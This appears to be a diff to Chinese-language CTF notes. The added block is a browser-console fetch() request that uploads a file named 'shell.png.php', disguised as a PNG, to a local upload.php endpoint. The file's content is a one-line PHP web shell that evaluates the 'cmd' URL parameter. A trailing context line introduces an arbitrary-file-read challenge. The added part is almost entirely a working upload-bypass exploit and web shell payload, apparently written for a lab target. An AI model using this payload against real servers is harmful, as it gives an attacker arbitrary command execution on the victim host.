@@ -1,3 +1,25 @@
+浏览器控制台上传文件
+```js
+fetch("http://localhost:18044/upload.php", {
+  "headers": {
+    "accept": "*/*",
+    "accept-language": "zh-CN,zh;q=0.9",
+    "content-type": "multipart/form-data; boundary=----WebKitFormBoundarypD5Oqfq5VcOyM095",
+    "sec-ch-ua": "\"Not/A)Brand\";v=\"99\", \"Google Chrome\";v=\"115\", \"Chromium\";v=\"115\"",
+    "sec-ch-ua-mobile": "?0",
+    "sec-ch-ua-platform": "\"Windows\"",
+    "sec-fetch-dest": "empty",
+    "sec-fetch-mode": "cors",
+    "sec-fetch-site": "same-origin"
+  },
+  "referrer": "http://localhost:18044/",
+  "referrerPolicy": "strict-origin-when-cross-origin",
+  "body": "------WebKitFormBoundarypD5Oqfq5VcOyM095\r\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.png.php\"\r\nContent-Type: image/png\r\n\r\n<?php eval($_GET['cmd']); ?>\r\n------WebKitFormBoundarypD5Oqfq5VcOyM095--\r\n",
+  "method": "POST",
+  "mode": "cors",
+  "credentials": "omit"
+});
+```
 # 任意文件读取(CTF)
 ```python
 run.sh
